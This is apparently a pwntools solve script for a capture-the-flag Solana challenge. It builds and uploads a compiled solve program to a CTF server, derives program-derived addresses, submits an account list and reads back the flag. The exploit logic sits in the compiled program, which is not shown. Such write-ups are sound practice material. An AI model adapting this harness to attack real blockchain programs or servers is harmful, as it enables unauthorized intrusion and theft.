import os
os.system('cargo build-sbf')

from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58

# context.log_level = 'debug'

# host = args.HOST or 'localhost'
# port = args.PORT or 5001

host = 'ctf.csd.lol'
port = 3551

r = remote(host, port)
solve = open('target/deploy/solwanna_solve.so', 'rb').read()
r.recvuntil(b'program pubkey: ')
r.sendline(b'6FMg8X4m1bARYXgbmXKmMcPPFU7LmM13ETD9fVEHz6ii')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))

santa_state, _ = PublicKey.find_program_address([b'santa_state'], program)
user_state, _ = PublicKey.find_program_address([b'user_state', bytes(user)], program)

system_program = PublicKey(base58.b58decode(b'11111111111111111111111111111111'))

r.sendline(b'5') # Number of accounts
print("PROGRAM=", program)
r.sendline(b'x ' + str(program).encode())
print("SANTA_STATE=", santa_state)
r.sendline(b'w ' + str(santa_state).encode())
print("USER_STATE=", user_state)
r.sendline(b'w ' + str(user_state).encode())
print("USER=", user)
r.sendline(b'ws ' + str(user).encode())
print("SYSTEM_PROGRAM=", system_program)
r.sendline(b'x ' + str(system_program).encode())
r.sendline(b'0')

leak = r.recvuntil(b'Flag: ')
print(leak)
r.stream()